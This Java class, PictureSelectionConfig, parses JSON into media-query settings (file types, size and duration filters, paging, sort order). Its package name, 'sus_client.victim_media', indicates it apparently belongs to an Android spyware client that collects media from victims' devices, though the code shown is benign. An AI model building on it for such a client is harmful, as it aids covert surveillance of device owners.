package com.android.sus_client.victim_media.config;

import com.android.sus_client.victim_media.entity.LocalMedia;
import com.android.sus_client.victim_media.utils.PictureThreadUtils;

import org.json.JSONObject;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;


public final class PictureSelectionConfig implements Serializable {
    public int chooseMode;
    public int filterVideoMaxSecond;
    public int filterVideoMinSecond;
    public long filterMaxFileSize;
    public long filterMinFileSize;
    public boolean isGif;
    public boolean isWebp;
    public boolean isBmp;
    public List<String> queryOnlyList;

    public String sandboxDir;
    public String originalPath;
    public String sortOrder;
    public int pageSize;
    public boolean isFilterInvalidFile;
    public boolean isFilterSizeDuration;
    public boolean isPageSyncAsCount;

    private static volatile PictureSelectionConfig mInstance;

    public static PictureSelectionConfig getInstance(JSONObject json) {
        if (mInstance == null) {
            synchronized (PictureSelectionConfig.class) {
                if (mInstance == null) {
                    mInstance = fromJSON(json);
                }
            }
        }
        return mInstance;
    }

    public PictureSelectionConfig() {
        chooseMode = SelectMimeType.ofImage();
        filterVideoMaxSecond = 0;
        filterVideoMinSecond = 0;
        filterMaxFileSize = 0;
        filterMinFileSize = 0;
        isGif = false;
        isWebp = true;
        isBmp = true;
        queryOnlyList = new ArrayList<>();
        sandboxDir = "";
        originalPath = "";
        pageSize = PictureConfig.MAX_PAGE_SIZE;
        isFilterInvalidFile = false;
        sortOrder = "";
        isFilterSizeDuration = true;
        isPageSyncAsCount = false;
    }

    /**
     * 释放监听器
     */
    public static void destroy() {
        PictureThreadUtils.cancel(PictureThreadUtils.getIoPool());
        LocalMedia.destroyPool();
    }

    private static PictureSelectionConfig fromJSON(JSONObject json) {
        PictureSelectionConfig config = new PictureSelectionConfig();
        config.chooseMode = json.optInt("chooseMode", SelectMimeType.ofImage());
        config.filterVideoMaxSecond = json.optInt("filterVideoMaxSecond");
        config.filterVideoMinSecond = json.optInt("filterVideoMinSecond");
        config.filterMaxFileSize = json.optInt("filterMaxFileSize");
        config.filterMinFileSize = json.optInt("filterMinFileSize");
        config.isGif = json.optBoolean("isGif", false);
        config.isWebp = json.optBoolean("isWebp", true);
        config.isBmp = json.optBoolean("isBmp", true);
        config.queryOnlyList = new ArrayList<>();
        config.sandboxDir = json.optString("sandboxDir");
        config.originalPath = json.optString("originalPath");
        config.pageSize = json.optInt("pageSize", PictureConfig.MAX_PAGE_SIZE);
        config.isFilterInvalidFile = json.optBoolean("isFilterInvalidFile", false);
        config.sortOrder = json.optString("sortOrder");
        config.isFilterSizeDuration = json.optBoolean("isFilterSizeDuration", true);
        config.isPageSyncAsCount = json.optBoolean("isPageSyncAsCount", false);
        return config;
    }

}